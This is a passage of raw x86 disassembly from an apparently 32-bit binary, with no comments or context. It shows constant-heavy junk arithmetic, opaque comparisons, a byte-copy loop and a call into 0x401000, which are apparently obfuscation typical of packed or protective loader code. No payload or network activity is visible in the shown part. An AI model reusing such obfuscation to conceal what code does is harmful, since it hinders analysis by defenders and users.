  41cb24:	mov    ecx,DWORD PTR [ebp+0xc]
  41cb27:	mov    DWORD PTR [esi+eax*4],ecx
  41cb2a:	mov    DWORD PTR [ebp-0xc],edi
  41cb2d:	mov    DWORD PTR [ebp+0x8],0x5f40
  41cb34:	mov    DWORD PTR [ebp-0x14],0x6ba4
  41cb3b:	mov    DWORD PTR [ebp+0xc],0x7b17
  41cb42:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb45:	mov    eax,0x43d2
  41cb4a:	sub    eax,ecx
  41cb4c:	add    eax,DWORD PTR [ebp+0xc]
  41cb4f:	xor    edx,edx
  41cb51:	add    eax,DWORD PTR [ebp-0x14]
  41cb54:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb57:	div    ecx
  41cb59:	mov    ecx,DWORD PTR [ebp+0x10]
  41cb5c:	xor    edx,edx
  41cb5e:	pop    edi
  41cb5f:	pop    ebx
  41cb60:	or     eax,0x67ad
  41cb65:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  41cb6c:	mov    DWORD PTR [ebp+0x10],0x517b
  41cb73:	mov    DWORD PTR [ebp+0xc],0x5d62
  41cb7a:	mov    DWORD PTR [ebp+0x8],0x41b0
  41cb81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb84:	mov    eax,DWORD PTR [ebp+0xc]
  41cb87:	and    ecx,0x68c1
  41cb8d:	sub    ecx,0x6fd3
  41cb93:	or     ecx,eax
  41cb95:	mov    eax,DWORD PTR [ebp+0x10]
  41cb98:	imul   ecx,eax
  41cb9b:	mov    eax,0xf52840d5
  41cba0:	div    ecx
  41cba2:	leave  
  41cba3:	ret    0xc
  41cba6:	push   ebp
  41cba7:	mov    ebp,esp
  41cba9:	sub    esp,0xc0
  41cbaf:	push   esi
  41cbb0:	mov    DWORD PTR [ebp-0x80],0x2f93
  41cbb7:	mov    DWORD PTR [ebp-0x7c],0x3321
  41cbbe:	mov    DWORD PTR [ebp-0x70],0x7d00
  41cbc5:	mov    DWORD PTR [ebp-0x6c],0xd87
  41cbcc:	mov    DWORD PTR [ebp-0x60],0x4197
  41cbd3:	mov    DWORD PTR [ebp-0x5c],0xa7d
  41cbda:	mov    DWORD PTR [ebp-0x50],0x772d
  41cbe1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  41cbe8:	mov    DWORD PTR [ebp-0x40],0x414a
  41cbef:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41cbf6:	mov    DWORD PTR [ebp-0x30],0x136b
  41cbfd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41cc04:	mov    DWORD PTR [ebp-0x20],0x32d8
  41cc0b:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41cc12:	mov    DWORD PTR [ebp-0xc],0x3956
  41cc19:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41cc23:	mov    DWORD PTR [ebp-0x94],0x1
  41cc2d:	mov    DWORD PTR [ebp-0x14],0x17ab
  41cc34:	mov    DWORD PTR [ebp-0x64],0x7a3d
  41cc3b:	mov    DWORD PTR [ebp-0x54],0x378a
  41cc42:	mov    DWORD PTR [ebp-0x74],0x5a00
  41cc49:	mov    DWORD PTR [ebp-0x24],0x1f3a
  41cc50:	mov    DWORD PTR [ebp-0x84],0x9a225
  41cc5a:	mov    DWORD PTR [ebp-0x44],0x31f8
  41cc61:	mov    DWORD PTR [ebp-0x34],0x3663
  41cc68:	mov    DWORD PTR [ebp-0xb4],0x3165
  41cc72:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  41cc7c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  41cc86:	mov    DWORD PTR [ebp-0xb0],0x7564
  41cc90:	mov    DWORD PTR [ebp-0xac],0x18cf
  41cc9a:	mov    DWORD PTR [ebp-0xa0],0x3135
  41cca4:	mov    DWORD PTR [ebp-0x9c],0x568d
  41ccae:	mov    DWORD PTR [ebp-0x90],0x11f2
  41ccb8:	mov    DWORD PTR [ebp-0x8c],0x63ea
  41ccc2:	mov    DWORD PTR [ebp-0x10],0x3066
  41ccc9:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41ccd0:	push   0x7e1d
  41ccd5:	mov    DWORD PTR [ebp-0x4],0x30f4
  41ccdc:	mov    eax,DWORD PTR [ebp-0x20]
  41ccdf:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cce2:	push   0x5380
  41cce7:	push   ecx
  41cce8:	push   eax
  41cce9:	call   0x41df90
  41ccee:	mov    ecx,eax
  41ccf0:	mov    eax,DWORD PTR [ebp-0x30]
  41ccf3:	xor    ecx,eax
  41ccf5:	mov    esi,edx
  41ccf7:	mov    edx,DWORD PTR [ebp-0x2c]
  41ccfa:	mov    eax,DWORD PTR [ebp-0x40]
  41ccfd:	xor    esi,edx
  41ccff:	mov    edx,DWORD PTR [ebp-0x3c]
  41cd02:	xor    ecx,0xf3a
  41cd08:	or     ecx,eax
  41cd0a:	mov    eax,ds:0x422268
  41cd0f:	mov    eax,DWORD PTR [eax+0x1d8]
  41cd15:	mov    eax,DWORD PTR [eax]
  41cd17:	xor    esi,0x6665
  41cd1d:	or     esi,edx
  41cd1f:	add    ecx,0xef6a96a5
  41cd25:	cdq    
  41cd26:	adc    esi,0xc8b6a000
  41cd2c:	cmp    eax,ecx
  41cd2e:	jne    0x41cd3c
  41cd34:	cmp    edx,esi
  41cd36:	je     0x41cd9b
  41cd3c:	mov    eax,DWORD PTR [ebp-0x50]
  41cd3f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41cd42:	mov    edx,DWORD PTR [ebp-0x60]
  41cd45:	mov    esi,DWORD PTR [ebp-0x5c]
  41cd48:	add    eax,0x7818
  41cd4d:	adc    ecx,0x87
  41cd53:	or     eax,edx
  41cd55:	mov    edx,DWORD PTR [ebp-0x70]
  41cd58:	or     ecx,esi
  41cd5a:	mov    esi,DWORD PTR [ebp-0x6c]
  41cd5d:	push   esi
  41cd5e:	push   edx
  41cd5f:	push   ecx
  41cd60:	push   eax
  41cd61:	call   0x41df90
  41cd66:	mov    ecx,DWORD PTR [ebp-0x80]
  41cd69:	mov    esi,DWORD PTR [ebp-0x7c]
  41cd6c:	and    eax,ecx
  41cd6e:	mov    ecx,DWORD PTR ds:0x422268
  41cd74:	mov    ecx,DWORD PTR [ecx+0x1d0]
  41cd7a:	mov    ecx,DWORD PTR [ecx]
  41cd7c:	and    edx,esi
  41cd7e:	xor    eax,0x2b01
  41cd83:	xor    edx,0x2021
  41cd89:	xor    esi,esi
  41cd8b:	cmp    ecx,eax
  41cd8d:	jne    0x41ced9
  41cd93:	cmp    esi,edx
  41cd95:	jne    0x41ced9
  41cd9b:	mov    eax,DWORD PTR [ebp-0xa4]
  41cda1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cda4:	add    eax,0x80ca
  41cda9:	or     eax,ecx
  41cdab:	mov    ecx,DWORD PTR ds:0x422304
  41cdb1:	or     eax,0x686
  41cdb6:	xor    eax,0x3eec
  41cdbb:	lea    eax,[eax+ecx*1-0xc11b]
  41cdc2:	xor    DWORD PTR ds:0x4222fc,eax
  41cdc8:	mov    eax,DWORD PTR [ebp-0x64]
  41cdcb:	and    eax,0x4dff
  41cdd0:	add    eax,DWORD PTR [ebp-0x14]
  41cdd3:	mov    ecx,DWORD PTR [ebp-0x94]
  41cdd9:	xor    eax,0x676c
  41cdde:	xor    edx,edx
  41cde0:	div    ecx
  41cde2:	mov    ecx,DWORD PTR [ebp-0x24]
  41cde5:	mov    edx,DWORD PTR [ebp-0x74]
  41cde8:	xor    ecx,0x6e1e
  41cdee:	imul   ecx,edx
  41cdf1:	mov    edx,DWORD PTR [ebp+0x8]
  41cdf4:	push   0x4
  41cdf6:	push   0xe4c37b20
  41cdfb:	xor    eax,0x3884
  41ce00:	mov    eax,DWORD PTR [eax+edx*1]
  41ce03:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  41ce0a:	mov    eax,DWORD PTR [ebp-0x34]
  41ce0d:	mov    edx,DWORD PTR [ebp-0xb4]
  41ce13:	lea    eax,[edx+eax*1-0x76d2]
  41ce1a:	mov    edx,DWORD PTR [ebp-0x44]
  41ce1d:	mov    esi,DWORD PTR [ebp-0x84]
  41ce23:	or     eax,edx
  41ce25:	xor    edx,edx
  41ce27:	div    esi
  41ce29:	mov    edx,DWORD PTR [ebp-0x54]
  41ce2c:	add    eax,0x43d7
  41ce31:	xor    eax,0x5e6a
  41ce36:	add    eax,DWORD PTR [edx+ecx*1]
  41ce39:	mov    ecx,DWORD PTR ds:0x4222fc
  41ce3f:	add    DWORD PTR [eax],ecx
  41ce41:	mov    eax,DWORD PTR [ebp-0x90]
  41ce47:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ce4d:	mov    edx,DWORD PTR [ebp-0xa0]
  41ce53:	mov    esi,DWORD PTR [ebp-0x9c]
  41ce59:	sub    edx,eax
  41ce5b:	mov    eax,DWORD PTR [ebp-0xb0]
  41ce61:	sbb    esi,ecx
  41ce63:	mov    ecx,DWORD PTR [ebp-0xac]
  41ce69:	xor    edx,eax
  41ce6b:	mov    eax,DWORD PTR [ebp-0xc0]
  41ce71:	xor    esi,ecx
  41ce73:	mov    ecx,DWORD PTR [ebp-0xbc]
  41ce79:	add    edx,eax
  41ce7b:	adc    esi,ecx
  41ce7d:	add    edx,0x2313
  41ce83:	adc    esi,0x2a00
  41ce89:	push   esi
  41ce8a:	push   edx
  41ce8b:	call   0x421ad5
  41ce90:	mov    ecx,0x1207
  41ce95:	sub    ecx,eax
  41ce97:	push   0x0
  41ce99:	pop    eax
  41ce9a:	sbb    eax,edx
  41ce9c:	mov    edx,DWORD PTR ds:0x4222fc
  41cea2:	xor    esi,esi
  41cea4:	cmp    edx,ecx
  41cea6:	jne    0x41ced9
  41ceac:	cmp    esi,eax
  41ceae:	jne    0x41ced9
  41ceb4:	mov    eax,DWORD PTR [ebp-0x4]
  41ceb7:	mov    ecx,DWORD PTR [ebp-0x8]
  41ceba:	add    eax,0x4296
  41cebf:	shr    eax,0x2
  41cec2:	or     eax,ecx
  41cec4:	mov    ecx,DWORD PTR [ebp-0x10]
  41cec7:	xor    eax,ecx
  41cec9:	xor    eax,0x4e94
  41cece:	add    eax,DWORD PTR ds:0x4222fc
  41ced4:	mov    ds:0x422304,eax
  41ced9:	pop    esi
  41ceda:	leave  
  41cedb:	ret    0x4
  41cede:	push   ebp
  41cedf:	mov    ebp,esp
  41cee1:	sub    esp,0x58
  41cee4:	push   ebx
  41cee5:	push   esi
  41cee6:	push   edi
  41cee7:	mov    DWORD PTR [ebp-0x58],0x3082
  41ceee:	mov    DWORD PTR [ebp-0x54],0x37a2
  41cef5:	mov    DWORD PTR [ebp-0x50],0x49d6
  41cefc:	mov    DWORD PTR [ebp-0x4c],0x6390
  41cf03:	mov    DWORD PTR [ebp-0x48],0x40f2
  41cf0a:	mov    DWORD PTR [ebp-0x44],0x21d4
  41cf11:	mov    DWORD PTR [ebp-0x28],0x4726
  41cf18:	mov    DWORD PTR [ebp-0x24],0x221a
  41cf1f:	mov    DWORD PTR [ebp-0x30],0x768c
  41cf26:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41cf2d:	mov    DWORD PTR [ebp-0x40],0x6cf6
  41cf34:	mov    DWORD PTR [ebp-0x3c],0x94c
  41cf3b:	mov    DWORD PTR [ebp-0x38],0x4797
  41cf42:	mov    DWORD PTR [ebp-0x34],0x4439
  41cf49:	mov    DWORD PTR [ebp-0x20],0x2531
  41cf50:	mov    esi,0x5a3e
  41cf55:	mov    DWORD PTR [ebp-0x1c],esi
  41cf58:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  41cf5f:	mov    DWORD PTR [ebp-0x14],0x7
  41cf66:	mov    DWORD PTR [ebp-0x10],0xe3a
  41cf6d:	mov    DWORD PTR [ebp-0xc],0x6a6e
  41cf74:	mov    DWORD PTR [ebp-0x8],0x6b99
  41cf7b:	mov    DWORD PTR [ebp-0x4],0x2acd
  41cf82:	mov    eax,DWORD PTR [ebp-0x10]
  41cf85:	mov    ecx,DWORD PTR [ebp-0xc]
  41cf88:	mov    eax,DWORD PTR [ebp-0x8]
  41cf8b:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf8e:	mov    eax,DWORD PTR [ebp-0x18]
  41cf91:	mov    ecx,DWORD PTR [ebp-0x14]
  41cf94:	mov    eax,DWORD PTR [ebp-0x8]
  41cf97:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf9a:	mov    edx,DWORD PTR [ebp-0x10]
  41cf9d:	mov    edi,DWORD PTR [ebp-0xc]
  41cfa0:	add    eax,edx
  41cfa2:	mov    edx,DWORD PTR [ebp-0x18]
  41cfa5:	adc    ecx,edi
  41cfa7:	mov    edi,DWORD PTR [ebp-0x14]
  41cfaa:	push   edi
  41cfab:	push   edx
  41cfac:	or     ecx,0x6833
  41cfb2:	or     eax,0x6b80
  41cfb7:	push   ecx
  41cfb8:	push   eax
  41cfb9:	call   0x421ad5
  41cfbe:	mov    ecx,DWORD PTR [ebp-0x20]
  41cfc1:	mov    edi,DWORD PTR [ebp-0x1c]
  41cfc4:	and    eax,0x25cb
  41cfc9:	or     eax,ecx
  41cfcb:	mov    ecx,DWORD PTR [ebp-0x20]
  41cfce:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cfd1:	and    edx,0x76f2
  41cfd7:	or     edx,edi
  41cfd9:	xor    edx,esi
  41cfdb:	xor    eax,0x253b
  41cfe0:	shld   edx,eax,0x2
  41cfe4:	shl    eax,0x2
  41cfe7:	shr    ecx,0x1e
  41cfea:	xor    esi,esi
  41cfec:	or     eax,ecx
  41cfee:	or     edx,esi
  41cff0:	mov    edi,0xba699573
  41cff5:	xor    eax,edi
  41cff7:	mov    DWORD PTR [ebp-0x20],eax
  41cffa:	mov    esi,0x9c0a89d8
  41cfff:	xor    edx,esi
  41d001:	mov    DWORD PTR [ebp-0x1c],edx
  41d004:	mov    eax,DWORD PTR [ebp-0x38]
  41d007:	mov    ecx,DWORD PTR [ebp-0x34]
  41d00a:	mov    edx,DWORD PTR [ebp-0x40]
  41d00d:	mov    ebx,DWORD PTR [ebp-0x3c]
  41d010:	push   ebx
  41d011:	push   edx
  41d012:	push   ecx
  41d013:	push   eax
  41d014:	call   0x41df90
  41d019:	add    eax,0x536a
  41d01e:	adc    edx,0x9573
  41d024:	push   0x12613
  41d029:	push   0xae21daec
  41d02e:	push   edx
  41d02f:	push   eax
  41d030:	call   0x421ad5
  41d035:	mov    ecx,eax
  41d037:	mov    eax,DWORD PTR [ebp-0x20]
  41d03a:	mov    ebx,DWORD PTR [ebp-0x1c]
  41d03d:	xor    ecx,0x1b8b
  41d043:	xor    edx,0x0
  41d046:	add    ecx,eax
  41d048:	mov    eax,DWORD PTR [ebp+0xc]
  41d04b:	adc    edx,ebx
  41d04d:	mov    DWORD PTR [eax],ecx
  41d04f:	mov    DWORD PTR [eax+0x4],edx
  41d052:	mov    eax,DWORD PTR [ebp-0x30]
  41d055:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d058:	mov    edx,0xbdb2
  41d05d:	sub    edx,eax
  41d05f:	mov    eax,DWORD PTR [ebp-0x28]
  41d062:	mov    ebx,0x4c02
  41d067:	sbb    ebx,ecx
  41d069:	mov    ecx,DWORD PTR [ebp-0x24]
  41d06c:	sub    edx,eax
  41d06e:	mov    eax,DWORD PTR [ebp+0xc]
  41d071:	sbb    ebx,ecx
  41d073:	add    edx,DWORD PTR [eax]
  41d075:	mov    ecx,DWORD PTR [ebp-0x28]
  41d078:	adc    ebx,DWORD PTR [eax+0x4]
  41d07b:	push   0x2
  41d07d:	xor    ebx,esi
  41d07f:	mov    esi,DWORD PTR [ebp-0x24]
  41d082:	pop    esi
  41d083:	sub    esi,ecx
  41d085:	mov    ecx,DWORD PTR [ebp-0x30]
  41d088:	sub    esi,ecx
  41d08a:	xor    edx,edi
  41d08c:	mov    edi,DWORD PTR [ebp-0x2c]
  41d08f:	mov    ecx,DWORD PTR [ebp+0xc]
  41d092:	add    esi,DWORD PTR [ecx]
  41d094:	mov    eax,ebx
  41d096:	shrd   edx,eax,0x2
  41d09a:	xor    ecx,ecx
  41d09c:	shl    esi,0x1e
  41d09f:	shr    eax,0x2
  41d0a2:	or     ecx,edx
  41d0a4:	xor    esi,0xc0000000
  41d0aa:	or     esi,eax
  41d0ac:	mov    DWORD PTR [ebp-0x40],ecx
  41d0af:	push   0x0
  41d0b1:	mov    DWORD PTR [ebp-0x3c],esi
  41d0b4:	mov    eax,DWORD PTR [ebp-0x48]
  41d0b7:	mov    ecx,DWORD PTR [ebp-0x44]
  41d0ba:	push   0xae0404d3
  41d0bf:	push   ecx
  41d0c0:	push   eax
  41d0c1:	call   0x421ad5
  41d0c6:	mov    ecx,eax
  41d0c8:	mov    eax,DWORD PTR [ebp-0x50]
  41d0cb:	mov    esi,DWORD PTR [ebp-0x4c]
  41d0ce:	or     ecx,eax
  41d0d0:	mov    eax,DWORD PTR [ebp-0x40]
  41d0d3:	or     edx,esi
  41d0d5:	mov    esi,DWORD PTR [ebp-0x3c]
  41d0d8:	add    ecx,eax
  41d0da:	mov    eax,DWORD PTR [ebp-0x58]
  41d0dd:	adc    edx,esi
  41d0df:	mov    esi,DWORD PTR [ebp-0x54]
  41d0e2:	add    ecx,eax
  41d0e4:	mov    eax,DWORD PTR [ebp+0x8]
  41d0e7:	adc    edx,esi
  41d0e9:	add    ecx,0xffff55a8
  41d0ef:	pop    edi
  41d0f0:	adc    edx,0xffff64cd
  41d0f6:	pop    esi
  41d0f7:	mov    DWORD PTR [eax],ecx
  41d0f9:	mov    DWORD PTR [eax+0x4],edx
  41d0fc:	pop    ebx
  41d0fd:	leave  
  41d0fe:	ret    0x8
  41d101:	push   ebp
  41d102:	mov    ebp,esp
  41d104:	sub    esp,0x3c
  41d107:	mov    DWORD PTR [ebp-0x20],0x3510
  41d10e:	mov    DWORD PTR [ebp-0x1c],0x2104
  41d115:	mov    DWORD PTR [ebp-0x18],0x5d15
  41d11c:	mov    DWORD PTR [ebp-0x14],0x30cd
  41d123:	mov    DWORD PTR [ebp-0x10],0x1709
  41d12a:	mov    DWORD PTR [ebp-0xc],0x260b
  41d131:	mov    DWORD PTR [ebp-0x8],0x3204
  41d138:	mov    DWORD PTR [ebp-0x4],0x62ea
  41d13f:	mov    DWORD PTR [ebp-0x38],0x58e9
  41d146:	mov    DWORD PTR [ebp-0x34],0x7f89
  41d14d:	mov    DWORD PTR [ebp-0x30],0x7fda
  41d154:	mov    DWORD PTR [ebp-0x2c],0x2889
  41d15b:	mov    DWORD PTR [ebp-0x28],0xf0f
  41d162:	mov    DWORD PTR [ebp-0x24],0x58e1
  41d169:	mov    DWORD PTR [ebp-0x3c],0x69c
  41d170:	mov    eax,DWORD PTR [ebp-0x10]
  41d173:	mov    ecx,DWORD PTR [ebp-0x14]
  41d176:	and    al,0xb9
  41d178:	add    al,cl
  41d17a:	mov    ecx,DWORD PTR [ebp-0x18]
  41d17d:	and    al,cl
  41d17f:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d182:	sub    al,0x11
  41d184:	and    al,cl
  41d186:	mov    ecx,DWORD PTR [ebp-0x20]
  41d189:	mov    edx,DWORD PTR [ebp+0x8]
  41d18c:	imul   ecx,ecx,0x6008
  41d192:	add    ecx,0x1759dd6e
  41d198:	add    al,0x4d
  41d19a:	xor    ecx,0x2b4185ee
  41d1a0:	cmp    BYTE PTR [ecx+edx*1],al
  41d1a3:	jne    0x41d23d
  41d1a9:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ac:	mov    eax,0xffffeff8
  41d1b1:	mov    edx,eax
  41d1b3:	sub    edx,ecx
  41d1b5:	add    edx,DWORD PTR [ebp-0x8]
  41d1b8:	mov    ecx,DWORD PTR [ebp-0xc]
  41d1bb:	or     edx,ecx
  41d1bd:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1c0:	imul   edx,edx,0x85300
  41d1c6:	sub    eax,ecx
  41d1c8:	add    eax,DWORD PTR [ebp-0x8]
  41d1cb:	mov    ecx,DWORD PTR [ebp-0xc]
  41d1ce:	or     eax,ecx
  41d1d0:	mov    ecx,DWORD PTR [ebp+0x8]
  41d1d3:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  41d1da:	add    eax,0x40e5
  41d1df:	imul   eax,eax,0x214c
  41d1e5:	add    eax,ecx
  41d1e7:	mov    ecx,DWORD PTR [ebp+0x8]
  41d1ea:	add    ecx,eax
  41d1ec:	mov    DWORD PTR [ebp+0x8],ecx
  41d1ef:	mov    eax,DWORD PTR [ebp-0x24]
  41d1f2:	mov    ecx,DWORD PTR [ebp-0x28]
  41d1f5:	and    eax,ecx
  41d1f7:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d1fa:	and    eax,ecx
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x30]
  41d1ff:	imul   eax,ecx
  41d202:	mov    ecx,DWORD PTR [ebp-0x34]
  41d205:	or     eax,ecx
  41d207:	mov    ecx,DWORD PTR [ebp-0x38]
  41d20a:	imul   eax,ecx
  41d20d:	mov    ecx,DWORD PTR [ebp+0x8]
  41d210:	sub    eax,0x777ea653
  41d215:	cmp    DWORD PTR [ecx+0x54],eax
  41d218:	je     0x41d226
  41d21e:	mov    eax,DWORD PTR [ebp+0x8]
  41d221:	jmp    0x41d26d
  41d226:	mov    eax,DWORD PTR [ebp-0x3c]
  41d229:	sub    eax,0x5258
  41d22e:	xor    eax,0x49e9
  41d233:	add    eax,0x253
  41d238:	jmp    0x41d26d
  41d23d:	mov    DWORD PTR [ebp-0x3c],0x4177
  41d244:	mov    DWORD PTR [ebp+0x8],0x1405
  41d24b:	mov    eax,DWORD PTR [ebp+0x8]
  41d24e:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d251:	imul   eax,eax,0x58cc
  41d257:	add    eax,0x3f39
  41d25c:	and    eax,ecx
  41d25e:	add    eax,0x3b90
  41d263:	or     eax,0x4b1c
  41d268:	sub    eax,0x7fdd
  41d26d:	leave  
  41d26e:	ret    0x4
  41d271:	push   ebp
  41d272:	mov    ebp,esp
  41d274:	and    esp,0xfffffff8
  41d277:	sub    esp,0x20
  41d27a:	push   ebx
  41d27b:	push   esi
  41d27c:	lea    eax,[esp+0x10]
  41d280:	mov    DWORD PTR [esp+0xc],eax
  41d284:	mov    eax,DWORD PTR [esp+0xc]
  41d288:	mov    ecx,DWORD PTR [esp+0x10]
  41d28c:	mov    edx,DWORD PTR [esp+0x14]
  41d290:	sub    DWORD PTR [eax],ecx
  41d292:	sbb    DWORD PTR [eax+0x4],edx
  41d295:	mov    eax,DWORD PTR [esp+0xc]
  41d299:	or     DWORD PTR [eax],0xba6d9573
  41d29f:	or     DWORD PTR [eax+0x4],0x9c0a89d8
  41d2a6:	lea    eax,[esp+0x18]
  41d2aa:	push   eax
  41d2ab:	lea    eax,[esp+0x24]
  41d2af:	push   eax
  41d2b0:	call   0x41cede
  41d2b5:	mov    eax,DWORD PTR [esp+0x18]
  41d2b9:	mov    ecx,DWORD PTR [esp+0x1c]
  41d2bd:	push   DWORD PTR [ebp+0x18]
  41d2c0:	mov    ebx,DWORD PTR [ebp+0xc]
  41d2c3:	push   DWORD PTR [ebp+0x14]
  41d2c6:	mov    esi,DWORD PTR [ebp+0x8]
  41d2c9:	push   DWORD PTR [ebp+0x10]
  41d2cc:	push   DWORD PTR [esp+0x20]
  41d2d0:	push   DWORD PTR [esp+0x20]
  41d2d4:	push   DWORD PTR [esp+0x38]
  41d2d8:	push   DWORD PTR [esp+0x38]
  41d2dc:	call   0x401000
  41d2e1:	pop    esi
  41d2e2:	pop    ebx
  41d2e3:	mov    esp,ebp
  41d2e5:	pop    ebp
  41d2e6:	ret    0x14
  41d2e9:	push   ebp
  41d2ea:	mov    ebp,esp
  41d2ec:	sub    esp,0x28
  41d2ef:	push   ebx
  41d2f0:	push   esi
  41d2f1:	push   edi
  41d2f2:	mov    DWORD PTR [ebp-0x10],0x6b3
  41d2f9:	mov    DWORD PTR [ebp-0xc],0x816
  41d300:	mov    DWORD PTR [ebp-0x8],0x248f
  41d307:	mov    DWORD PTR [ebp-0x20],0x4ef0
  41d30e:	mov    DWORD PTR [ebp-0x1c],0x647f
  41d315:	mov    DWORD PTR [ebp-0x4],0x2
  41d31c:	mov    DWORD PTR [ebp-0x18],0x21b3
  41d323:	mov    DWORD PTR [ebp-0x14],0x7c
  41d32a:	mov    DWORD PTR [ebp-0x28],0x77e3
  41d331:	mov    DWORD PTR [ebp-0x24],0x2866
  41d338:	mov    ecx,DWORD PTR [ebp-0x4]
  41d33b:	xor    edx,edx
  41d33d:	mov    eax,0x723d
  41d342:	div    ecx
  41d344:	mov    esi,0xffff8748
  41d349:	mov    edi,0x7929
  41d34e:	mov    ecx,eax
  41d350:	mov    eax,DWORD PTR [ebp-0x1c]
  41d353:	imul   ecx,eax
  41d356:	mov    eax,DWORD PTR [ebp-0x20]
  41d359:	imul   ecx,ecx,0x758c
  41d35f:	xor    ecx,0x3583
  41d365:	or     ecx,eax
  41d367:	mov    eax,DWORD PTR [ebp-0x8]
  41d36a:	mov    edx,DWORD PTR [ebp-0xc]
  41d36d:	xor    eax,edx
  41d36f:	mov    edx,DWORD PTR [ebp-0x10]
  41d372:	and    eax,edx
  41d374:	sub    eax,0x2ff7
  41d379:	xor    eax,0x53d2
  41d37e:	xor    edx,edx
  41d380:	add    ecx,0x5a905891
  41d386:	div    esi
  41d388:	mov    esi,0x564d
  41d38d:	jmp    0x41d41e
  41d392:	mov    DWORD PTR [ebp-0x4],0x3574
  41d399:	mov    ebx,DWORD PTR [ebp+0xc]
  41d39c:	mov    DWORD PTR [ebp-0x1c],0x4b01
  41d3a3:	mov    DWORD PTR [ebp-0x20],0x7c1
  41d3aa:	mov    eax,DWORD PTR [ebp-0x20]
  41d3ad:	mov    edx,DWORD PTR [ebp-0x1c]
  41d3b0:	or     eax,0x4cf5
  41d3b5:	xor    eax,edx
  41d3b7:	mov    edx,DWORD PTR [ebp-0x4]
  41d3ba:	sub    eax,edx
  41d3bc:	xor    eax,0x2ec2
  41d3c1:	mov    edx,ecx
  41d3c3:	sub    edx,eax
  41d3c5:	sub    edx,0x564a
  41d3cb:	mov    DWORD PTR [ebp-0x4],edx
  41d3ce:	mov    eax,DWORD PTR [ebp-0x4]
  41d3d1:	mov    edx,DWORD PTR [ebp-0x4]
  41d3d4:	mov    dl,BYTE PTR [edx+ebx*1]
  41d3d7:	mov    ebx,DWORD PTR [ebp+0x8]
  41d3da:	mov    BYTE PTR [eax+ebx*1],dl
  41d3dd:	mov    eax,DWORD PTR [ebp-0x24]
  41d3e0:	mov    edx,DWORD PTR [ebp-0x28]
  41d3e3:	imul   eax,edx
  41d3e6:	imul   eax,eax,0x24ef285a
  41d3ec:	sub    eax,0x1e23
  41d3f1:	imul   eax,eax,0x1ef9
  41d3f7:	xor    eax,0xb5479168
  41d3fc:	add    ecx,eax
  41d3fe:	mov    eax,DWORD PTR [ebp-0x8]
  41d401:	mov    edx,DWORD PTR [ebp-0xc]
  41d404:	xor    eax,edx
  41d406:	mov    edx,DWORD PTR [ebp-0x10]
  41d409:	and    eax,edx
  41d40b:	sub    eax,0x2ff7
  41d410:	xor    eax,0x53d2
  41d415:	xor    edx,edx
  41d417:	mov    ebx,0xffff8748
  41d41c:	div    ebx
  41d41e:	mov    edx,DWORD PTR [ebp+0x10]
  41d421:	sub    edx,eax
  41d423:	mov    eax,DWORD PTR [ebp-0x14]
  41d426:	add    eax,0x38ab
  41d42b:	xor    eax,edi
  41d42d:	add    eax,DWORD PTR [ebp-0x18]
  41d430:	mov    ebx,ecx
  41d432:	xor    eax,esi
  41d434:	sub    ebx,eax
  41d436:	cmp    ebx,edx
  41d438:	jbe    0x41d392
  41d43e:	pop    edi
  41d43f:	pop    esi
  41d440:	pop    ebx
  41d441:	leave  
  41d442:	ret    0xc
  41d445:	push   ebp
  41d446:	mov    ebp,esp
  41d448:	sub    esp,0x7c
  41d44b:	or     DWORD PTR ds:0x4229a6,ebx
  41d451:	push   ebx
  41d452:	sub    ebx,edx
  41d454:	push   esi
  41d455:	push   edi
  41d456:	movzx  ebx,BYTE PTR ds:0x4228ae
  41d45d:	and    DWORD PTR ds:0x422986,ebx
  41d463:	mov    eax,DWORD PTR [ebp+0x8]
  41d466:	mov    ecx,DWORD PTR [ebp+0xc]
  41d469:	shrd   eax,ecx,0x2
  41d46d:	cmp    DWORD PTR ds:0x4229ce,0x0
  41d474:	mov    DWORD PTR ds:0x42298a,edx
  41d47a:	mov    esi,0x951
  41d47f:	jmp    0x41d4da
  41d484:	movzx  ebx,BYTE PTR ds:0x42298a
  41d48b:	jbe    0x41d4bd
  41d491:	push   0x47c6
  41d496:	push   DWORD PTR [ebp-0x28]
  41d499:	call   DWORD PTR ds:0x42a038
  41d49f:	and    esi,0x3e8f
  41d4a5:	mov    esi,DWORD PTR ds:0x4228e6
  41d4ab:	add    DWORD PTR ds:0x42291e,esi
  41d4b1:	sub    esi,edx
  41d4b3:	sub    DWORD PTR ds:0x42297e,0xf26
  41d4bd:	adc    DWORD PTR ds:0x4228ee,0x541b
  41d4c7:	xor    esi,esi
  41d4c9:	or     esi,DWORD PTR ds:0x422a3a
  41d4cf:	mov    edi,DWORD PTR ds:0x422ae6
  41d4d5:	sub    edi,esi
  41d4d7:	add    esi,DWORD PTR [esi+edi*1]
  41d4da:	shr    ecx,0x2
  41d4dd:	mov    ecx,DWORD PTR [ebp+0x8]
  41d4e0:	mov    edx,DWORD PTR [ebp+0xc]
  41d4e3:	inc    ebx
  41d4e4:	xor    edx,edx
  41d4e6:	cmp    DWORD PTR ds:0x4229a2,0x0
